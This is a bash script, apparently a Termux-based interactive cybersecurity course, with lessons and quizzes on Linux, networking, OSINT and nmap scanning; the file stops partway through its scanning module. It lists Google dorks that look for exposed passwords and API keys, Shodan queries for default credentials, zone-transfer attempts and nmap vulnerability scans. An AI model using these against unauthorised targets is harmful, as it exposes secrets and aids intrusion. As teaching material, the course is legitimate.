#!/bin/bash
# ============================================
# CYBER SECURITY COURSE FOR TERMUX
# Author: Emmanuel suah
# Version: 1.0
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Course Progress File
PROGRESS_FILE="$HOME/.cybercourse_progress"
NOTES_FILE="$HOME/.cybercourse_notes"

# ============================================
# UTILITY FUNCTIONS
# ============================================

clear_screen() {
    clear
}

print_banner() {
    clear_screen
    echo -e "${RED}"
    echo "  ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗███████╗ ██████╗"
    echo " ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔════╝██╔════╝"
    echo " ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ███████╗█████╗  ██║"
    echo " ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ╚════██║██╔══╝  ██║"
    echo " ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ███████║███████╗╚██████╗"
    echo "  ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚══════╝╚══════╝ ╚═════╝"
    echo -e "${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}          TERMUX CYBER SECURITY COURSE v1.0                ${NC}"
    echo -e "${YELLOW}          Educational Purposes Only - Learn Ethically      ${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
}

print_separator() {
    echo -e "${CYAN}────────────────────────────────────────────────────────────${NC}"
}

press_enter() {
    echo ""
    echo -e "${YELLOW}Press [ENTER] to continue...${NC}"
    read -r
}

loading_bar() {
    local msg="$1"
    echo -ne "${GREEN}$msg${NC}"
    for i in {1..30}; do
        echo -ne "${GREEN}█${NC}"
        sleep 0.05
    done
    echo -e " ${GREEN}Done!${NC}"
}

save_progress() {
    local module="$1"
    local status="$2"
    echo "$module=$status" >> "$PROGRESS_FILE"
    sort -u "$PROGRESS_FILE" -o "$PROGRESS_FILE" 2>/dev/null
}

check_progress() {
    local module="$1"
    if [ -f "$PROGRESS_FILE" ]; then
        grep -q "^$module=completed$" "$PROGRESS_FILE" && echo "✅" || echo "⬜"
    else
        echo "⬜"
    fi
}

quiz_question() {
    local question="$1"
    local answer="$2"
    local hint="$3"
    
    echo -e "${YELLOW}❓ QUIZ: $question${NC}"
    echo -e "${BLUE}   Hint: $hint${NC}"
    echo -ne "${WHITE}Your Answer: ${NC}"
    read -r user_answer
    
    if [[ "${user_answer,,}" == "${answer,,}" ]]; then
        echo -e "${GREEN}✅ Correct! Well done!${NC}"
        return 0
    else
        echo -e "${RED}❌ Incorrect. The answer is: $answer${NC}"
        return 1
    fi
}

# ============================================
# MODULE 1: INTRODUCTION TO CYBERSECURITY
# ============================================

module1_intro() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 1: INTRODUCTION TO CYBERSECURITY${NC}"
    print_separator
    
    echo -e "${WHITE}
📚 WHAT IS CYBERSECURITY?
─────────────────────────
Cybersecurity is the practice of protecting systems, networks,
and programs from digital attacks. These attacks usually aim to:

  • Access, change, or destroy sensitive information
  • Extort money from users
  • Interrupt normal business processes

🎯 THE CIA TRIAD (Foundation of Security):
─────────────────────────────────────────
  ${CYAN}[C]${WHITE} CONFIDENTIALITY
      Ensuring information is accessible only to
      those authorized to have access.
      Example: Encryption, Access Controls

  ${CYAN}[I]${WHITE} INTEGRITY
      Maintaining and assuring the accuracy and
      completeness of data over its lifecycle.
      Example: Checksums, Digital Signatures

  ${CYAN}[A]${WHITE} AVAILABILITY
      Ensuring authorized users have access to
      information and resources when needed.
      Example: Redundancy, Backups, DDoS Protection

🔐 TYPES OF CYBERSECURITY:
───────────────────────────
  1. Network Security       - Protecting computer networks
  2. Application Security   - Securing software applications
  3. Information Security   - Protecting data integrity
  4. Cloud Security         - Securing cloud environments
  5. Operational Security   - Processes for data handling
  6. Disaster Recovery      - Responding to cyber incidents
  7. End-user Education     - Training the human element
${NC}"

    print_separator
    echo -e "${PURPLE}🏆 KEY CONCEPTS:${NC}"
    echo -e "${WHITE}
  • THREAT: Any potential danger to information or systems
  • VULNERABILITY: Weakness that can be exploited
  • RISK: Probability that a threat exploits a vulnerability
  • EXPLOIT: Code/technique that takes advantage of a bug
  • PAYLOAD: Malicious code executed after exploitation
  • ZERO-DAY: Unknown vulnerability with no available patch
${NC}"

    press_enter
    
    # Quiz Section
    echo -e "${BOLD}${YELLOW}📝 MODULE 1 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What does the 'C' in CIA Triad stand for?" \
        "confidentiality" \
        "Think about keeping secrets..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What is a weakness in a system called?" \
        "vulnerability" \
        "It can be exploited by attackers..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "An unknown vulnerability with no patch is called?" \
        "zero-day" \
        "The number of days vendors have known about it..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    
    if [ $score -ge 2 ]; then
        echo -e "${GREEN}🎉 Excellent! Module 1 Completed!${NC}"
        save_progress "module1" "completed"
    else
        echo -e "${YELLOW}📖 Review the material and try again!${NC}"
    fi
    
    press_enter
}

# ============================================
# MODULE 2: LINUX & TERMUX FUNDAMENTALS
# ============================================

module2_linux() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 2: LINUX & TERMUX FUNDAMENTALS${NC}"
    print_separator
    
    echo -e "${WHITE}
🐧 WHY LINUX FOR CYBERSECURITY?
────────────────────────────────
  • Open Source - Code is transparent and auditable
  • Highly Customizable - Tailor your environment
  • Powerful Command Line - Automate everything
  • Wide Tool Support - Most security tools run on Linux
  • Used by professionals - Kali, Parrot, BlackArch

📱 TERMUX ESSENTIAL COMMANDS:
──────────────────────────────${NC}"

    echo -e "${CYAN}NAVIGATION:${NC}"
    echo -e "${GREEN}  pwd${WHITE}          - Print working directory${NC}"
    echo -e "${GREEN}  ls -la${WHITE}       - List all files with details${NC}"
    echo -e "${GREEN}  cd /path${WHITE}     - Change directory${NC}"
    echo -e "${GREEN}  cd ..${WHITE}        - Go up one directory${NC}"
    echo -e "${GREEN}  cd ~${WHITE}         - Go to home directory${NC}"
    
    echo ""
    echo -e "${CYAN}FILE OPERATIONS:${NC}"
    echo -e "${GREEN}  touch file${WHITE}   - Create empty file${NC}"
    echo -e "${GREEN}  mkdir dir${WHITE}    - Create directory${NC}"
    echo -e "${GREEN}  cp src dst${WHITE}   - Copy file${NC}"
    echo -e "${GREEN}  mv src dst${WHITE}   - Move/rename file${NC}"
    echo -e "${GREEN}  rm file${WHITE}      - Remove file${NC}"
    echo -e "${GREEN}  rm -rf dir${WHITE}   - Remove directory recursively${NC}"
    echo -e "${GREEN}  cat file${WHITE}     - Display file content${NC}"
    echo -e "${GREEN}  nano file${WHITE}    - Edit file with nano${NC}"
    
    echo ""
    echo -e "${CYAN}SYSTEM INFO:${NC}"
    echo -e "${GREEN}  uname -a${WHITE}     - System information${NC}"
    echo -e "${GREEN}  whoami${WHITE}       - Current user${NC}"
    echo -e "${GREEN}  id${WHITE}           - User ID information${NC}"
    echo -e "${GREEN}  ps aux${WHITE}       - Running processes${NC}"
    echo -e "${GREEN}  top${WHITE}          - Real-time process monitor${NC}"
    echo -e "${GREEN}  df -h${WHITE}        - Disk space usage${NC}"
    echo -e "${GREEN}  free -h${WHITE}      - Memory usage${NC}"
    
    echo ""
    echo -e "${CYAN}NETWORK COMMANDS:${NC}"
    echo -e "${GREEN}  ifconfig${WHITE}     - Network interface info${NC}"
    echo -e "${GREEN}  ip addr${WHITE}      - IP address information${NC}"
    echo -e "${GREEN}  ping host${WHITE}    - Test connectivity${NC}"
    echo -e "${GREEN}  netstat -an${WHITE}  - Network connections${NC}"
    echo -e "${GREEN}  ss -tulpn${WHITE}    - Socket statistics${NC}"
    echo -e "${GREEN}  curl url${WHITE}     - Transfer data from URL${NC}"
    echo -e "${GREEN}  wget url${WHITE}     - Download files${NC}"
    
    echo ""
    echo -e "${CYAN}PERMISSIONS:${NC}"
    echo -e "${GREEN}  chmod 755 file${WHITE} - Change file permissions${NC}"
    echo -e "${GREEN}  chown user file${WHITE} - Change file owner${NC}"
    
    echo ""
    echo -e "${CYAN}TEXT PROCESSING:${NC}"
    echo -e "${GREEN}  grep 'pattern' file${WHITE} - Search text pattern${NC}"
    echo -e "${GREEN}  grep -r 'text' dir${WHITE}  - Recursive search${NC}"
    echo -e "${GREEN}  sort file${WHITE}           - Sort lines${NC}"
    echo -e "${GREEN}  uniq file${WHITE}           - Remove duplicates${NC}"
    echo -e "${GREEN}  wc -l file${WHITE}          - Count lines${NC}"
    echo -e "${GREEN}  awk '{print $1}' file${WHITE} - Process text${NC}"
    echo -e "${GREEN}  sed 's/old/new/g' file${WHITE} - Replace text${NC}"
    echo -e "${GREEN}  cut -d':' -f1 file${WHITE}  - Cut by delimiter${NC}"
    
    press_enter
    
    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL EXERCISE:${NC}"
    print_separator
    echo -e "${WHITE}Let's practice some real commands!${NC}"
    echo ""
    
    echo -e "${YELLOW}Exercise 1: Create a directory structure${NC}"
    echo -e "${WHITE}Commands to run:${NC}"
    echo -e "${GREEN}  mkdir -p ~/cybercourse/labs/module2${NC}"
    echo -e "${GREEN}  cd ~/cybercourse/labs/module2${NC}"
    echo -e "${GREEN}  touch notes.txt${NC}"
    echo -e "${GREEN}  echo 'Hello Cybersecurity!' > notes.txt${NC}"
    echo -e "${GREEN}  cat notes.txt${NC}"
    
    echo ""
    echo -ne "${YELLOW}Execute these commands? (y/n): ${NC}"
    read -r execute
    
    if [[ "$execute" == "y" || "$execute" == "Y" ]]; then
        loading_bar "Creating lab environment "
        mkdir -p ~/cybercourse/labs/module2
        cd ~/cybercourse/labs/module2 || exit
        touch notes.txt
        echo 'Hello Cybersecurity!' > notes.txt
        echo ""
        echo -e "${GREEN}✅ Results:${NC}"
        echo -e "${WHITE}Directory created: $(pwd)${NC}"
        echo -e "${WHITE}File content: $(cat notes.txt)${NC}"
        echo -e "${WHITE}Files in directory:${NC}"
        ls -la
    fi
    
    press_enter
    
    echo -e "${BOLD}${PURPLE}📋 FILE PERMISSIONS EXPLAINED:${NC}"
    print_separator
    echo -e "${WHITE}
  Permission Format: ${CYAN}rwxrwxrwx${WHITE}
                    │││││││││
                    │││││││└─ Others: Execute
                    ││││││└── Others: Write
                    │││││└─── Others: Read
                    ││││└──── Group: Execute
                    │││└───── Group: Write
                    ││└────── Group: Read
                    │└─────── Owner: Execute
                    └──────── Owner: Write & Read

  Common Permissions:
  ${GREEN}chmod 777${WHITE} - rwxrwxrwx (everyone everything - DANGEROUS!)
  ${GREEN}chmod 755${WHITE} - rwxr-xr-x (owner all, others read/execute)
  ${GREEN}chmod 644${WHITE} - rw-r--r-- (owner read/write, others read)
  ${GREEN}chmod 600${WHITE} - rw------- (owner only - for sensitive files)
  ${GREEN}chmod 400${WHITE} - r-------- (read only - for keys/certs)
${NC}"

    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 2 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "Which command shows current directory?" \
        "pwd" \
        "Print Working Directory..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What permission number gives only owner read/write?" \
        "600" \
        "rw------- in octal..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which command searches for text patterns in files?" \
        "grep" \
        "Global Regular Expression Print..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module2" "completed" && \
        echo -e "${GREEN}🎉 Module 2 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 3: NETWORKING CONCEPTS
# ============================================

module3_networking() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 3: NETWORKING FUNDAMENTALS${NC}"
    print_separator
    
    echo -e "${WHITE}
🌐 THE OSI MODEL:
──────────────────
  The OSI (Open Systems Interconnection) model
  describes how data travels through a network.

${NC}"
    echo -e "${RED}  Layer 7 - APPLICATION   ${WHITE}HTTP, FTP, DNS, SSH, SMTP${NC}"
    echo -e "${YELLOW}  Layer 6 - PRESENTATION  ${WHITE}SSL/TLS, Encryption, Encoding${NC}"
    echo -e "${GREEN}  Layer 5 - SESSION       ${WHITE}Session management, NetBIOS${NC}"
    echo -e "${CYAN}  Layer 4 - TRANSPORT     ${WHITE}TCP, UDP, Port numbers${NC}"
    echo -e "${BLUE}  Layer 3 - NETWORK       ${WHITE}IP, ICMP, Routing${NC}"
    echo -e "${PURPLE}  Layer 2 - DATA LINK     ${WHITE}Ethernet, MAC addresses${NC}"
    echo -e "${WHITE}  Layer 1 - PHYSICAL      ${WHITE}Cables, Hubs, Signals${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}🔌 TCP vs UDP:${NC}"
    print_separator
    echo -e "${WHITE}
  TCP (Transmission Control Protocol):
  ├── Connection-oriented (3-way handshake)
  ├── SYN → SYN-ACK → ACK
  ├── Reliable, ordered delivery
  ├── Error checking and correction
  └── Used by: HTTP, HTTPS, FTP, SSH, SMTP

  UDP (User Datagram Protocol):
  ├── Connectionless
  ├── No guarantee of delivery
  ├── Faster but less reliable
  └── Used by: DNS, DHCP, VoIP, Gaming, Streaming
${NC}"

    echo -e "${BOLD}${CYAN}🔢 COMMON PORT NUMBERS:${NC}"
    print_separator
    echo -e "${WHITE}
  ${GREEN}Port 21${WHITE}   - FTP (File Transfer Protocol)
  ${GREEN}Port 22${WHITE}   - SSH (Secure Shell)
  ${GREEN}Port 23${WHITE}   - Telnet (Unencrypted!)
  ${GREEN}Port 25${WHITE}   - SMTP (Email sending)
  ${GREEN}Port 53${WHITE}   - DNS (Domain Name System)
  ${GREEN}Port 80${WHITE}   - HTTP (Web - Unencrypted)
  ${GREEN}Port 110${WHITE}  - POP3 (Email receiving)
  ${GREEN}Port 143${WHITE}  - IMAP (Email access)
  ${GREEN}Port 443${WHITE}  - HTTPS (Web - Encrypted)
  ${GREEN}Port 445${WHITE}  - SMB (Windows file sharing)
  ${GREEN}Port 3306${WHITE} - MySQL Database
  ${GREEN}Port 3389${WHITE} - RDP (Remote Desktop)
  ${GREEN}Port 8080${WHITE} - HTTP Alternative
  ${GREEN}Port 8443${WHITE} - HTTPS Alternative
${NC}"

    echo -e "${BOLD}${CYAN}🏠 IP ADDRESSING:${NC}"
    print_separator
    echo -e "${WHITE}
  IPv4 Format: xxx.xxx.xxx.xxx (32-bit)
  Example: 192.168.1.100

  PRIVATE IP RANGES (Non-routable):
  ├── 10.0.0.0    - 10.255.255.255    (Class A)
  ├── 172.16.0.0  - 172.31.255.255    (Class B)
  └── 192.168.0.0 - 192.168.255.255   (Class C)

  SPECIAL ADDRESSES:
  ├── 127.0.0.1   - Localhost (loopback)
  ├── 0.0.0.0     - All interfaces
  └── 255.255.255.255 - Broadcast

  SUBNET MASK EXAMPLES:
  ├── /8  = 255.0.0.0       (16M hosts)
  ├── /16 = 255.255.0.0     (65K hosts)
  ├── /24 = 255.255.255.0   (254 hosts)
  └── /32 = 255.255.255.255 (1 host)

  IPv6 Format: xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx:xxxx
  Example: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🔍 DNS EXPLAINED:${NC}"
    print_separator
    echo -e "${WHITE}
  DNS (Domain Name System) translates domain names to IPs.

  DNS Resolution Process:
  ┌─────────────────────────────────────┐
  │  Browser asks: What is google.com?  │
  └──────────────┬──────────────────────┘
                 │
  ┌──────────────▼──────────────────────┐
  │  Check local DNS cache              │
  └──────────────┬──────────────────────┘
                 │ (not found)
  ┌──────────────▼──────────────────────┐
  │  Ask Recursive Resolver (ISP DNS)   │
  └──────────────┬──────────────────────┘
                 │
  ┌──────────────▼──────────────────────┐
  │  Ask Root Name Server (.)           │
  └──────────────┬──────────────────────┘
                 │
  ┌──────────────▼──────────────────────┐
  │  Ask TLD Server (.com)              │
  └──────────────┬──────────────────────┘
                 │
  ┌──────────────▼──────────────────────┐
  │  Ask Authoritative Server           │
  │  Returns: 142.250.80.46             │
  └─────────────────────────────────────┘

  DNS RECORD TYPES:
  ├── A     - IPv4 Address record
  ├── AAAA  - IPv6 Address record
  ├── MX    - Mail Exchange record
  ├── CNAME - Canonical Name (alias)
  ├── NS    - Name Server record
  ├── TXT   - Text record (SPF, DKIM)
  ├── PTR   - Reverse DNS lookup
  └── SOA   - Start of Authority
${NC}"

    press_enter
    
    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL - Network Commands Demo:${NC}"
    print_separator
    
    echo -e "${WHITE}Installing network tools in Termux...${NC}"
    echo -e "${YELLOW}Commands we'll practice:${NC}"
    echo ""
    echo -e "${GREEN}1. ping -c 4 8.8.8.8${WHITE}        - Ping Google DNS${NC}"
    echo -e "${GREEN}2. nslookup google.com${WHITE}      - DNS lookup${NC}"
    echo -e "${GREEN}3. curl -I https://google.com${WHITE} - HTTP headers${NC}"
    echo -e "${GREEN}4. traceroute google.com${WHITE}    - Trace network path${NC}"
    
    echo ""
    echo -ne "${YELLOW}Run ping test to 8.8.8.8? (y/n): ${NC}"
    read -r run_ping
    
    if [[ "$run_ping" == "y" || "$run_ping" == "Y" ]]; then
        echo -e "${GREEN}Running: ping -c 4 8.8.8.8${NC}"
        echo ""
        ping -c 4 8.8.8.8 2>/dev/null || echo -e "${RED}Ping failed - check internet connection${NC}"
    fi
    
    echo ""
    echo -ne "${YELLOW}Run DNS lookup for google.com? (y/n): ${NC}"
    read -r run_dns
    
    if [[ "$run_dns" == "y" || "$run_dns" == "Y" ]]; then
        echo -e "${GREEN}Running: nslookup google.com${NC}"
        echo ""
        if command -v nslookup &>/dev/null; then
            nslookup google.com 2>/dev/null
        else
            echo -e "${YELLOW}Installing dnsutils...${NC}"
            pkg install dnsutils -y 2>/dev/null
            nslookup google.com 2>/dev/null
        fi
    fi
    
    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 3 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "Which port does SSH use by default?" \
        "22" \
        "Secure Shell default port..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What does DNS stand for?" \
        "domain name system" \
        "It translates names to IP addresses..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which protocol is connectionless: TCP or UDP?" \
        "udp" \
        "The faster but less reliable one..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module3" "completed" && \
        echo -e "${GREEN}🎉 Module 3 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 4: INFORMATION GATHERING & OSINT
# ============================================

module4_osint() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 4: INFORMATION GATHERING & OSINT${NC}"
    print_separator
    
    echo -e "${WHITE}
🔍 WHAT IS OSINT?
──────────────────
  OSINT (Open Source Intelligence) is the collection and
  analysis of information from publicly available sources.

  ⚠️  LEGAL NOTE: Only perform reconnaissance on targets
  you own or have explicit written permission to test!

📋 OSINT SOURCES:
──────────────────
  1. SEARCH ENGINES
     • Google Dorks
     • Bing, DuckDuckGo
     • Shodan (IoT search engine)

  2. SOCIAL MEDIA
     • LinkedIn - Professional info
     • Twitter/X - Real-time info
     • Facebook - Personal info
     • Instagram - Location data

  3. PUBLIC RECORDS
     • WHOIS databases
     • Government databases
     • Court records
     • Business registrations

  4. TECHNICAL SOURCES
     • DNS records
     • SSL certificates
     • Job postings
     • GitHub repositories
     • Pastebin dumps
${NC}"

    echo -e "${BOLD}${CYAN}🔎 GOOGLE DORKS:${NC}"
    print_separator
    echo -e "${WHITE}
  Google Dorks are advanced search operators to find
  specific information using Google's search engine.

  BASIC OPERATORS:
  ${GREEN}site:${WHITE}target.com          - Search within specific site
  ${GREEN}intitle:${WHITE}'admin panel'    - Pages with specific title
  ${GREEN}inurl:${WHITE}login              - URLs containing keyword
  ${GREEN}filetype:${WHITE}pdf             - Specific file types
  ${GREEN}intext:${WHITE}'password'        - Pages with specific text
  ${GREEN}cache:${WHITE}target.com         - Cached version of page
  ${GREEN}link:${WHITE}target.com          - Pages linking to site
  ${GREEN}related:${WHITE}target.com       - Similar websites

  USEFUL COMBINATIONS:
  ${YELLOW}site:target.com filetype:pdf${WHITE}
  ${YELLOW}intitle:"index of" "parent directory"${WHITE}
  ${YELLOW}site:target.com intext:"password"${WHITE}
  ${YELLOW}filetype:sql "insert into" "values"${WHITE}
  ${YELLOW}intitle:"phpMyAdmin" inurl:"/phpmyadmin/"${WHITE}
  ${YELLOW}inurl:".git" "index of"${WHITE}
  ${YELLOW}filetype:env "DB_PASSWORD"${WHITE}
  ${YELLOW}site:github.com "api_key" OR "secret_key"${WHITE}

  ⚠️  Use responsibly and only on authorized targets!
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🌐 WHOIS LOOKUP:${NC}"
    print_separator
    echo -e "${WHITE}
  WHOIS provides registration information about domains.

  Information revealed:
  ├── Registrant name and organization
  ├── Contact email and phone
  ├── Registration and expiry dates
  ├── Name servers
  ├── Registrar information
  └── Technical contacts

  NOTE: Many use privacy protection to hide this data.
${NC}"

    echo -ne "${YELLOW}Run WHOIS on google.com for demonstration? (y/n): ${NC}"
    read -r run_whois
    
    if [[ "$run_whois" == "y" || "$run_whois" == "Y" ]]; then
        if ! command -v whois &>/dev/null; then
            echo -e "${YELLOW}Installing whois...${NC}"
            pkg install whois -y 2>/dev/null
        fi
        echo -e "${GREEN}Running: whois google.com${NC}"
        echo ""
        whois google.com 2>/dev/null | head -40
    fi
    
    press_enter
    
    echo -e "${BOLD}${CYAN}🔎 DNS ENUMERATION:${NC}"
    print_separator
    echo -e "${WHITE}
  DNS enumeration discovers subdomains and DNS records.

  COMMANDS (Termux):
${NC}"
    echo -e "${GREEN}  # Basic DNS lookup${NC}"
    echo -e "${WHITE}  nslookup target.com${NC}"
    echo ""
    echo -e "${GREEN}  # Get all DNS records${NC}"
    echo -e "${WHITE}  dig target.com ANY${NC}"
    echo ""
    echo -e "${GREEN}  # Find mail servers${NC}"
    echo -e "${WHITE}  dig target.com MX${NC}"
    echo ""
    echo -e "${GREEN}  # Reverse DNS lookup${NC}"
    echo -e "${WHITE}  dig -x 8.8.8.8${NC}"
    echo ""
    echo -e "${GREEN}  # Zone transfer attempt (often blocked)${NC}"
    echo -e "${WHITE}  dig axfr @nameserver target.com${NC}"
    echo ""
    echo -e "${GREEN}  # Find subdomains manually${NC}"
    echo -e "${WHITE}  for sub in www mail ftp admin blog api; do${NC}"
    echo -e "${WHITE}    host \$sub.target.com 2>/dev/null | grep 'has address'${NC}"
    echo -e "${WHITE}  done${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}📧 EMAIL OSINT:${NC}"
    print_separator
    echo -e "${WHITE}
  Gathering information through email addresses:

  • theHarvester - Email/subdomain discovery tool
  • Hunter.io    - Find email addresses by domain
  • Have I Been Pwned - Check breach exposure
  • EmailRep     - Email reputation service
  • Phonebook.cz - Email search engine

  EMAIL HEADER ANALYSIS:
  Email headers contain valuable information:
  ├── Originating IP address
  ├── Mail server path (hops)
  ├── Email client used
  ├── Timestamps
  └── SPF/DKIM validation results

  To view headers in Gmail: More → Show Original
${NC}"

    echo -e "${BOLD}${PURPLE}🔧 PRACTICAL - theHarvester Demo:${NC}"
    print_separator
    echo -e "${WHITE}theHarvester is a popular OSINT tool.${NC}"
    echo ""
    echo -e "${GREEN}Installation in Termux:${NC}"
    echo -e "${WHITE}  pkg install python${NC}"
    echo -e "${WHITE}  pip install theHarvester${NC}"
    echo ""
    echo -e "${GREEN}Basic Usage:${NC}"
    echo -e "${WHITE}  theHarvester -d target.com -b google${NC}"
    echo -e "${WHITE}  theHarvester -d target.com -b bing,linkedin${NC}"
    echo -e "${WHITE}  theHarvester -d target.com -b all${NC}"
    
    echo ""
    echo -e "${BOLD}${CYAN}🛡️ SHODAN BASICS:${NC}"
    print_separator
    echo -e "${WHITE}
  Shodan is a search engine for internet-connected devices.

  What Shodan can find:
  ├── Open ports and services
  ├── Software versions
  ├── Default credentials
  ├── Industrial control systems
  ├── Vulnerable devices
  └── Geolocation data

  SHODAN QUERIES:
  ${YELLOW}product:Apache version:2.2${NC}
  ${YELLOW}default password country:US${NC}
  ${YELLOW}port:22 "SSH" country:IN${NC}
  ${YELLOW}os:"Windows XP"${NC}
  ${YELLOW}title:"webcamXP"${NC}
  ${YELLOW}hostname:target.com${NC}

  Website: shodan.io (free account available)
${NC}"

    press_enter
    
    # Quiz
    echo -e "${BOLD}${YELLOW}📝 MODULE 4 QUIZ${NC}"
    print_separator
    
    score=0
    
    quiz_question \
        "What does OSINT stand for?" \
        "open source intelligence" \
        "Intelligence from publicly available sources..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "Which operator in Google restricts search to a specific website?" \
        "site:" \
        "site:example.com..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    quiz_question \
        "What tool is used to search for internet-connected devices?" \
        "shodan" \
        "The search engine for hackers..."
    [ $? -eq 0 ] && ((score++))
    
    echo ""
    echo -e "${CYAN}Your Score: $score/3${NC}"
    [ $score -ge 2 ] && save_progress "module4" "completed" && \
        echo -e "${GREEN}🎉 Module 4 Completed!${NC}"
    
    press_enter
}

# ============================================
# MODULE 5: SCANNING & ENUMERATION
# ============================================

module5_scanning() {
    print_banner
    echo -e "${BOLD}${GREEN}MODULE 5: SCANNING & ENUMERATION${NC}"
    print_separator
    
    echo -e "${WHITE}
⚠️  LEGAL WARNING:
  Only scan systems you own or have explicit permission to scan.
  Unauthorized scanning is illegal in most jurisdictions!

🔍 PORT SCANNING WITH NMAP:
────────────────────────────
  NMAP (Network Mapper) is the industry-standard port scanner.

  NMAP SCAN TYPES:
${NC}"
    echo -e "${GREEN}  TCP SYN Scan (Stealth):${WHITE}"
    echo -e "  ${CYAN}nmap -sS target${NC}  # Requires root"
    echo ""
    echo -e "${GREEN}  TCP Connect Scan:${WHITE}"
    echo -e "  ${CYAN}nmap -sT target${NC}  # No root needed"
    echo ""
    echo -e "${GREEN}  UDP Scan:${WHITE}"
    echo -e "  ${CYAN}nmap -sU target${NC}"
    echo ""
    echo -e "${GREEN}  Service Version Detection:${WHITE}"
    echo -e "  ${CYAN}nmap -sV target${NC}"
    echo ""
    echo -e "${GREEN}  OS Detection:${WHITE}"
    echo -e "  ${CYAN}nmap -O target${NC}"
    echo ""
    echo -e "${GREEN}  Aggressive Scan (All features):${WHITE}"
    echo -e "  ${CYAN}nmap -A target${NC}"
    echo ""
    echo -e "${GREEN}  Script Scan:${WHITE}"
    echo -e "  ${CYAN}nmap -sC target${NC}"
    echo ""
    echo -e "${GREEN}  Full Comprehensive Scan:${WHITE}"
    echo -e "  ${CYAN}nmap -sV -sC -O -p- target${NC}"
    
    press_enter
    
    echo -e "${BOLD}${CYAN}📋 NMAP COMMON FLAGS:${NC}"
    print_separator
    echo -e "${WHITE}
  ${GREEN}-p 80,443${WHITE}      - Scan specific ports
  ${GREEN}-p 1-1000${WHITE}      - Scan port range
  ${GREEN}-p-${WHITE}            - Scan all 65535 ports
  ${GREEN}--top-ports 100${WHITE} - Scan 100 most common ports
  ${GREEN}-T0 to -T5${WHITE}     - Timing (0=slowest, 5=fastest)
  ${GREEN}-iL list.txt${WHITE}   - Input from file
  ${GREEN}-oN output.txt${WHITE} - Normal output to file
  ${GREEN}-oX output.xml${WHITE} - XML output to file
  ${GREEN}-oG output.gnmap${WHITE} - Grepable output
  ${GREEN}-v${WHITE}             - Verbose output
  ${GREEN}-vv${WHITE}            - Extra verbose
  ${GREEN}--open${WHITE}         - Show only open ports
  ${GREEN}--script=vuln${WHITE}  - Run vulnerability scripts
  ${GREEN}-Pn${WHITE}            - Skip host discovery (treat as up)
  ${GREEN}-n${WHITE}             - No DNS resolution

  PRACTICAL EXAMPLES:
  ${CYAN}nmap -sV -p 80,443,22 192.168.1.1${NC}
  ${CYAN}nmap -sC -sV --open -p- 192.168.1.0/24${NC}
  ${CYAN}nmap -T4 -F target.com${NC}
  ${CYAN}nmap --script=http-title -p 80 target.com${NC}
${NC}"

    press_enter
    
    echo -e "${BOLD}${CYAN}🔢 NMAP SCAN STATES:${NC}"
    print_separator
    echo -e "${WHITE}
  Ports can be in these states:

  ${GREEN}OPEN${WHITE}        - Port is accepting connections
  ${RED}CLOSED${WHITE}      - Port is accessible but no service
  ${YELLOW}FILTERED${WHITE}   - Firewall blocking the port
  ${CYAN}UNFILTERED${WHITE} - Port accessible, state unknown
  ${PURPLE}OPEN|FILTERED${WHITE} - Cannot determine state
  ${BLUE}CLOSED|FILTERED${WHITE} - Cannot determine state
${NC}"

    echo -e "${BOLD}${CYAN}📁 NMAP SCRIPTS (NSE):${NC}"
    print_separator
    echo -e "${WHITE}
  Nmap Scripting Engine (NSE) automates tasks.
  Scripts located at: /usr/share/nmap/scripts/

  USEFUL SCRIPTS:
  ${CYAN}--script=http-headers${WHITE}   - HTTP headers
  ${CYAN}--script=http-title${WHITE}     - Page titles
  ${CYAN}--script=ssh-auth-methods${WHITE} - SSH auth methods
